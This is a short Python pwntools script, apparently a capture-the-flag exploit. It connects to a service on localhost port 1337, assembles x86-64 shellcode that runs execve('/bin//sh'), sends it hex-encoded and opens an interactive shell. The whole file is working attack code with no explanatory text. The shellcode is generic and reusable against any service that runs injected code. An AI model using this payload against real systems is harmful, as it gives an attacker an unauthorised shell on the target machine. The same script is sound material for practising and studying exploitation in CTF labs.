from pwn import *
from icecream import ic

io = remote("localhost", 1337) # i forgot the port lol
context.log_level = 'debug'

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

shellcode = asm("""
    xor rsi,rsi
    push rsi
    mov rdi,0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    push 59
    pop rax
    cdq
    syscall        
""")

a = shellcode.hex()
sl(a)

io.interactive()